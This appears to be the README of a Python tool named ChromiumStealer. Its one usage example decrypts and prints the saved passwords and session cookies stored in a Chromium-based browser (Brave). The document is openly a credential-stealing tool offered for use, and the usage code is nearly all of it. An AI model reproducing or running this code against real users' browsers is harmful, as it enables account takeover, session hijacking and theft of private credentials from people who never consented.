# ChromiumStealer

```python
from ChromiumStealer import ChromiumStealer
from ChromiumStealer import Browsers

def main():
    stealer = ChromiumStealer(Browsers.Brave)
    if not stealer.exists():
        print(f'Browser does not exist.')
    else:
        stealer.initialize_crypter()

        for cookie in stealer.cookies():
            print(cookie['host'], cookie['name'], cookie['value'])

        for login in stealer.logins():
            print(login['url'], login['login'], login['password'])

if __name__ == '__main__':
    main()
```
